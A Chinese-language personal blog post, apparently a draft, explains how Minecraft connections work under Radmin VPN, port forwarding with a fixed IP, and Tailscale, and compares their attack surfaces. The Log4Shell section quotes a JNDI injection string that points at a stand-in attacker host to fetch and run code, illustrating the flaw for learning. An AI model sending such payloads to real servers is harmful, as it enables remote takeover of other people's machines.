這篇想回答一個我小時候完全沒想過的問題：**朋友按下「加入伺服器」的那一瞬間，封包到底是怎麼跑到我家電腦上的？**

我自己經歷了三個階段：照著 YouTube 教學裝 **Radmin VPN**、我哥幫我申請**固定 IP** 開 port，到現在用 **Tailscale** 把家裡的機器串成一個小小的 homelab。每一個階段我當時都只知道「這樣就能連」，但不知道為什麼。剛好最近為了準備金盾讀了 [從 0 開始的 Web Security 系列](https://ithelp.ithome.com.tw/m/articles/10237617) 和 [seadog007](https://seadog007.me/) 的 [網路安全基礎概念與實作](https://ithelp.ithome.com.tw/m/articles/10351000) <!-- TODO: 確認「海報」指的是哪個作者／系列 -->，回頭看才發現，當年的我其實對整個網際網路開了不少扇門（還好沒人進來，大概）。

如果你也是那種「架過 Minecraft 伺服器但不知道自己在幹嘛」的人，這篇應該會有點用。

## 先講結論

| | Radmin VPN | 固定 IP + Port Forwarding | Tailscale |
|---|---|---|---|
| 朋友要裝東西嗎 | 要，大家都裝 Radmin | 不用，輸入 IP 就好 | 要，大家都進同一個 tailnet |
| 誰看得到我的伺服器 | 同一個 Radmin 網路的人 | **整個網際網路** | 我允許的裝置 |
| 中間人是誰 | Radmin 的伺服器 | 我家路由器 | Tailscale 的協調伺服器（只交換金鑰） |
| 加密 | 有 | Minecraft 本身只有部分加密 | WireGuard，端對端 |
| 我當時懂多少 | 0 | 一點點 | 終於算懂了吧 |

## 為什麼朋友本來就連不進來？

在講任何工具之前，要先知道問題在哪。

家裡的電腦拿到的 IP 通常長得像 `192.168.1.23`，這是一個**私有 IP**。它只在你家這個區域網路裡有意義，全世界有幾億台電腦都叫 `192.168.1.23`，所以網路上的其他人根本不可能用這個地址找到你。

真正對外的只有你家路由器（或數據機）拿到的那一個**公有 IP**。家裡所有裝置出門的時候，路由器會把來源地址換成自己的公有 IP，回來的時候再查表送回對的那台電腦，這件事叫做 **NAT**。

> **NAT（Network Address Translation）**：讓很多台私有 IP 的裝置共用一個公有 IP 上網的機制。副作用是：**外面的人只能回應你主動發起的連線，沒辦法主動敲你的門。**

所以朋友在自己家輸入我的 IP 想連 Minecraft 的 `25565` port，封包到了我家路由器之後，路由器會一臉疑惑：「我又沒跟你講過話，這包要給誰？」然後直接丟掉。

這就是為什麼「自己開服、朋友連不進來」幾乎是每個 Minecraft 小孩的第一個網路問題。

```text
朋友 ──▶ 我家公有 IP:25565 ──▶ 路由器：？？？（丟掉）
                                    ╳
                              我的電腦 192.168.1.23
```

接下來三個階段，本質上都是在用不同方法解決這張圖的那個 ╳。

## 第一階段：照著教學裝 Radmin VPN

<!-- TODO: 幾年級、看的是哪部教學、跟誰一起玩、玩什麼（生存？模組包？） -->

小時候的流程大概是這樣：大家一起裝 Radmin VPN，其中一個人建一個網路，其他人輸入網路名稱跟密碼加進來，然後開 Minecraft、**對區域網路開放**，朋友的多人遊戲列表裡就會神奇地出現我的世界。

當時覺得這是魔法，現在來拆一下。

### 它其實是在你電腦裡插了一張假網卡

裝完 Radmin VPN 之後，系統會多出一張**虛擬網路介面卡**，並且拿到一個長得像 `26.x.x.x` 的 IP。之後所有送往 `26.x.x.x` 的封包都會被 Radmin 接走、加密、再透過它自己的方式送到對方電腦，對方的 Radmin 解開之後再交給作業系統。

對 Minecraft 來說，它完全不知道中間發生了什麼，**它只覺得大家都插在同一台交換器上**。

> 小知識：`26.0.0.0/8` 這段位址其實是公有 IP 段，原本是分配給美國國防部的，Radmin 只是「借來用」在自己的虛擬網路裡（同類型的 Hamachi 用的是 `25.x.x.x`）。正常情況下不會撞到，但這種做法本身就有點微妙。

### 「對區域網路開放」為什麼找得到？

Minecraft 的「對區域網路開放」會定期往一個 multicast 地址 `224.0.2.60:4445` 廣播「嘿，這裡有一個世界」。同一個區域網路裡的其他 Minecraft 聽到之後，就把它列在多人遊戲清單裡。

Radmin 讓大家「看起來」在同一個區網，所以這個廣播也會被送過去，這就是不用輸入 IP 也能看到世界的原因。

### 那 NAT 怎麼辦？

Radmin 的伺服器負責**介紹**：它知道每個人的公有 IP 和 port，會試著讓兩邊直接打洞連線（下面講 Tailscale 時會細講），打不通的話再由它的伺服器幫忙轉送。所以那張圖的 ╳，是靠**第三方伺服器居中牽線**解決的。

## 第二階段：我哥幫我申請固定 IP

<!-- TODO: 什麼時候、為什麼想換（朋友不想裝 Radmin？想 24hr 開服？）、我哥是怎麼處理的、哪家 ISP -->

後來我哥幫我申請了**固定 IP**，從此朋友不用再裝任何東西，在多人遊戲裡輸入一串 IP 就能連進來。這個階段做了兩件事：

1. **固定 IP**：一般家用網路的公有 IP 可能會變（浮動 IP），甚至根本不是真的公有 IP（電信商自己又做了一層 NAT，叫 CGNAT）。固定 IP 代表我家有一個**全世界唯一、不會變**的地址。
2. **Port Forwarding**：在路由器上設定「從外面打到 `25565` 的，全部轉給 `192.168.1.23:25565`」。

這下 ╳ 就變成 ✓ 了：

```text
朋友 ──▶ 我家公有 IP:25565 ──▶ 路由器：查表，25565 → 192.168.1.23
                                    │
                                    ▼
                              我的電腦 192.168.1.23:25565
```

### 按下「加入伺服器」之後

假設我還幫它綁了一個網域（例如 `mc.example.com`），朋友按下連線的那一秒大概發生了這些事：

1. **DNS 查詢**：朋友的電腦問 DNS「`mc.example.com` 在哪？」拿到我家的公有 IP。（Minecraft 還會先查一筆 `_minecraft._tcp` 的 **SRV 紀錄**，所以其實可以不用 25565 也不用打 port）
2. **TCP 三向交握**：朋友送出 `SYN` 到我家公有 IP 的 25565。
3. **路由器做 DNAT**：路由器看到目標是 25565，照 port forwarding 的規則把目的地改成 `192.168.1.23`，送進家裡。
4. **伺服器回應**：我的電腦回 `SYN-ACK`，路由器再把來源改回公有 IP 送出去。
5. **Minecraft 協定**：開始握手、驗證帳號（`online-mode=true` 時會去問 Mojang 的伺服器這個人是不是正版）、開始加密、傳地圖。

是不是突然覺得那個轉圈圈的「正在連線」畫面很努力。

## 第三階段：Tailscale 和家裡的 homelab

現在家裡的桌機跑著 Discord Bot、Minecraft Server、AI Agent，還多了一台被我哥汰舊的 M1 Max（詳細可以看 [硬體總結](https://hawks.tw/talk/2026-09-30/)）。我人在外面的時候，是用 **Tailscale** 連回家，再 SSH 進每一台機器。

Tailscale 看起來跟 Radmin 很像：每台裝置一樣會多一張虛擬網卡、一樣會拿到一個奇怪的 IP（`100.x.x.x`），但底層的設計差很多。

### 控制面和資料面是分開的

- **協調伺服器（Coordination Server）**：Tailscale 公司的伺服器只負責「誰是誰」：登入驗證、發放每台裝置的公鑰、告訴大家彼此可能的位址。**它看不到你的流量。**
- **資料面**：真正的封包是裝置之間直接用 **WireGuard** 加密傳輸，金鑰只在兩端。

> **WireGuard**：一個很精簡的 VPN 協定，整個核心只有幾千行程式碼，被併入了 Linux kernel。Tailscale 就是在它上面加上「自動交換金鑰 + 自動打洞」的那一層。

### NAT 打洞：兩個都在 NAT 後面的人怎麼直接連？

這是我覺得最酷的部分。我的筆電在外面的咖啡廳（NAT 後面），桌機在家裡（也在 NAT 後面），兩邊都沒有開任何 port，為什麼能直接連？

1. 兩邊各自問 STUN 伺服器：「你從外面看我，我的公有 IP 和 port 是多少？」
2. 透過協調伺服器把這個資訊交換給對方。
3. **兩邊同時**朝對方的公有 IP:port 送 UDP 封包。
4. 各自的 NAT 看到「我自己送出去過封包給對方」，於是把對方送來的封包當作「回應」放行。

洞就這樣打通了。如果真的打不通（例如很嚴格的公司或學校網路），就退回用 Tailscale 的 **DERP 中繼伺服器**轉送，但因為是 WireGuard 端對端加密，中繼伺服器一樣看不到內容。

可以用這個指令看現在是直連還是走中繼：

```bash
tailscale ping my-desktop
```

如果輸出是 `via DERP(tok)` 之類的就是在繞路，看到 `via 1.2.3.4:41641` 就是直接打通了。

### 所以朋友要怎麼連 Minecraft？

把朋友邀請進我的 tailnet（或用 **Node Sharing** 只分享那一台機器），朋友連 `my-desktop:25565` 就好。**路由器上一個 port 都不用開。**

## 換一個角度：用 Web Security 回頭看

<!-- TODO: 一兩句講這本書／這次閱讀在講什麼、最有感的一個觀念 -->

讀 Web Security 最大的收穫，是開始習慣問一個問題：**這個東西的攻擊面（Attack Surface）是什麼？誰能碰得到它？**

用這個問題回頭看三個階段，答案差很多。

### 固定 IP + 開 port：你的門牌對全世界公開

開 port 的那一刻，`25565` 就不是「給朋友的」，是**給整個 IPv4 網際網路的**。IPv4 只有大約 43 億個位址，用 masscan 這類工具幾分鐘就能掃完一輪，Shodan 這種搜尋引擎更是每天都在做這件事。

這不是理論。2022 年就有人做了一個專門全網掃 Minecraft 伺服器的專案，掃到沒設白名單的伺服器就直接進去，不少人的世界因此被破壞。

更經典的是 **Log4Shell**（CVE-2021-44228）。2021 年底，Minecraft Java 版用的日誌套件 Log4j 被發現：只要在聊天室打一串像 `${jndi:ldap://攻擊者/x}` 的字，伺服器記 log 的時候就會去連攻擊者的伺服器、下載並執行程式碼。**一則聊天訊息就能讓整台電腦被控制**，而那台電腦就是我拿來寫作業、存所有東西的桌機。

> 這跟 Web 的 injection 系列（SQLi、XSS、SSTI）其實是同一個故事：**把使用者輸入當成可以被解析、被執行的東西**。換成遊戲聊天室，一樣會出事。

另外，固定 IP 本身也是一個資訊：它大概能對應到你住在哪個區域，被盯上的時候也很容易被 DDoS，換 IP 還要再打給電信商。

### Radmin VPN：門沒對全世界開，但你信任了誰？

Radmin 的攻擊面小很多，只有同一個網路的人碰得到你。但有兩件事值得想：

1. **你在跟陌生人共用區網**：很多公開的 Radmin 網路是為了某款遊戲開的，裡面的人你都不認識。而在「區網」裡，你的電腦可能預設會分享資料夾、印表機，Windows 防火牆對「私人網路」也通常比較寬鬆。
2. **你信任了一個閉源的第三方**：中間牽線的伺服器、虛擬網卡驅動程式都是別人寫的，你只能相信它。

這就是 Web Security 裡常講的**信任邊界（Trust Boundary）**：我把哪些人、哪些系統放進了「自己人」的範圍裡？小時候的我答案是「看教學的那個 YouTuber 叫我裝的都算」。

### Tailscale：零信任，但不是零風險

Tailscale 的做法比較接近**零信任（Zero Trust）**：預設不信任網路位置，每台裝置都要靠身份登入、靠金鑰證明自己是誰，還可以用 ACL 寫清楚誰能連到誰的哪個 port，例如只讓朋友連 Minecraft、不能 SSH：

```json
{
  "acls": [
    { "action": "accept", "src": ["autogroup:member"], "dst": ["*:*"] },
    { "action": "accept", "src": ["friend@example.com"], "dst": ["my-desktop:25565"] }
  ]
}
```

第一條讓我自己的裝置互通，第二條只開 Minecraft 那一個 port 給朋友。這就是**最小權限原則（Least Privilege）**，在 Web 上它長得像「API token 只給需要的 scope」。

但它不是萬能的：

- **帳號就是鑰匙**：Tailscale 用 Google / GitHub 登入，帳號被盜等於整個 homelab 被進來。**2FA 一定要開。**
- **Log4Shell 一樣會發生**：攻擊面變小不代表伺服器沒洞，只是能打的人變少了。朋友的電腦中毒，一樣可以從 tailnet 裡打進來。
- **Funnel 要小心**：Tailscale 有一個 Funnel 功能可以把服務直接公開到網際網路，開了就又回到第二階段的世界。

## 結語

從 Radmin、固定 IP 到 Tailscale，我做的事情一直都一樣：**讓朋友連進我的 Minecraft。** 差別只在於，我越來越知道封包經過了誰、我信任了誰、又把門開給了誰。

小時候的我大概只在乎「連得上就好」，現在會先想「這扇門關得起來嗎」。我覺得這就是學資安之後最大的改變吧（還有變得很怕開 port）。
